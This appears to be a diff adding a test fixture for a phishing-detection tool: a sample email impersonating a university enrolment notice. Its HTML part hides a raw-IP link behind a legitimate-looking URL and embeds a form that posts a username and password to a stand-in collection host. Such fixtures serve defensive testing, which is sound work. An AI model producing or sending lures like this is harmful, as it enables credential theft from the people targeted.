@@ -1,0 +1,29 @@
+Authentication-Results: mx.receiver.example; spf=pass
+ smtp.mailfrom=campus-notice.example; dkim=pass
+ header.d=campus-notice.example; dmarc=pass header.from=campus-notice.example
+From: Student Services <noreply@campus-notice.example>
+To: Student <student@example.edu.au>
+Subject: Your enrolment has been updated
+Date: Tue, 06 Oct 2026 10:15:00 +1100
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4319549121274768174=="
+Message-ID: <anchor_mismatch@phishlens.test>
+
+--===============4319549121274768174==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Your enrolment has been updated. Review it at https://my.monash.edu/login
+
+--===============4319549121274768174==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<p>Your enrolment has been updated.</p><p>Review it here: <a href=3D"http://2=
+03.0.113.45/monash/login.php">https://my.monash.edu/login</a></p><form action=
+=3D"http://203.0.113.45/collect" method=3D"post"><input name=3D"user"><input =
+name=3D"pass" type=3D"password"><button>Confirm</button></form>
+
+--===============4319549121274768174==--
